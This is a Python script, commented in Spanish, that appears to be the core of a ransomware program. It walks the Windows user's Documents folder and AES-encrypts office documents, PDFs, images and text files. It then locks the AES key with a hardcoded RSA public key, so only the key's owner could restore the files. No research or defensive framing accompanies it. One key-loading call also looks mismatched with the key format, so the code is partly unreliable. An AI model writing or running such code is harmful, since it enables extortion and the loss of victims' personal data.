import os
import rsa
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

# Función para generar una clave AES aleatoria de 256 bits
def generar_clave_aes():
    return get_random_bytes(32)  # 32 bytes = 256 bits

# Función para cifrar la clave AES con RSA utilizando la llave pública proporcionada
def cifrar_clave_aes_rsa(clave_aes, public_key_pem):
    public_key = rsa.PublicKey.load_pkcs1(public_key_pem.encode())
    clave_cifrada = rsa.encrypt(clave_aes, public_key)
    return base64.b64encode(clave_cifrada).decode()

# Función para cifrar archivos con AES
def cifrar_archivo_aes(archivo, clave_aes):
    cipher = AES.new(clave_aes, AES.MODE_CBC)
    iv = cipher.iv
    with open(archivo, 'rb') as f:
        datos = f.read()

    datos_cifrados = cipher.encrypt(pad(datos, AES.block_size))
    with open(archivo + '.enc', 'wb') as f:
        f.write(iv + datos_cifrados)

# Obtener el directorio "Documents" del usuario
user_profile = os.environ['USERPROFILE']
documents_dir = os.path.join(user_profile, 'Documents')

# Extensiones que se desean cifrar
extensions = ['.docx', '.xlsx', '.pdf', '.jpeg', '.jpg', '.txt']

# Generar clave AES
clave_aes = generar_clave_aes()

# Llave pública proporcionada
public_key_pem = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA9Ecl++68RzR8L2kzvUj4
pWc0NSnXtz4BfOLqXLpYDWDIV9e1oS437VeZzf7rvxKUnjTmgu+PSU8P4ejwwN03
9+HYtxyBBE1XJDz8jGwt4hzjlWmYBgVJEiySGZL2s6LPvtE2NGEubcgylGLXNbp9
5uZsKuqP0SksLK5SHisoNxrDa86hisGyRDrKRFt2QOwKKM9TkP0LKJOGXZglAj8n
zq3mBlVbmdJU36o/CkN9iG6x1iho+VcQV3k2oMuSah3Epf3bLMmtnMe7zihi37G6
/AmcHnrJjBJ8F+a6ig3PCY+Ww6Z8kb6uXESOExDX86vmYrzMaNw9DN2pyuPcFipJ
dQIDAQAB
-----END PUBLIC KEY-----'''

# Cifrar la clave AES con RSA
clave_aes_cifrada = cifrar_clave_aes_rsa(clave_aes, public_key_pem)

# Guardar la clave cifrada en un archivo
with open(os.path.join(documents_dir, 'clave_aes_cifrada.txt'), 'w') as f:
    f.write(clave_aes_cifrada)

# Cifrar los archivos seleccionados
for foldername, subfolders, filenames in os.walk(documents_dir):
    for filename in filenames:
        if any(filename.endswith(ext) for ext in extensions):
            file_path = os.path.join(foldername, filename)
            cifrar_archivo_aes(file_path, clave_aes)  # Cifrar el archivo con AES

print(f'Archivos cifrados con AES-256 en {documents_dir}. La clave AES cifrada ha sido guardada en "clave_aes_cifrada.txt".')
